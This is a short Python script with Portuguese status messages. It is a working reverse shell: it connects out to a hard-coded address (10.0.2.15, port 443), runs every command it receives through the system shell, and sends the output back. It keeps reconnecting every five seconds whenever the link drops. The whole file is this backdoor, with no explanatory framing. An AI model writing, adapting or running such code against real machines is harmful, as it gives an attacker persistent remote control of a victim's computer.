import socket
import time
import subprocess

IP = '10.0.2.15'
PORT = 443

def connect(IP, PORT):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP, PORT))
        s.send('[!] Conexao recebida\n')
        return s
    except Exception as e:
        print('Erro de conexao')
        return None

def listen(s):
    try:
        while True:
            data = s.recv(1024)
            if data[:-1] == '/exit':
                s.close()
                exit(0)
            else:
                cmd(s, data[:-1])
    except:
        print('Erro na listen')
        error(s)

def cmd(s, data):
    try:
        proc = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        saida = proc.stdout.read() + proc.stderr.read()
        s.send(saida+'\n')
    except:
        print('Erro no cmd')
        error(s)

def error(s):
    if s:
        s.close()
    main()

def main():
    while True:
        s_conectado = connect(IP, PORT)
        if s_conectado:
            listen(s_conectado)
        else:
            print('Conexão deu erro, tentando novamente')
            time.sleep(5)

main()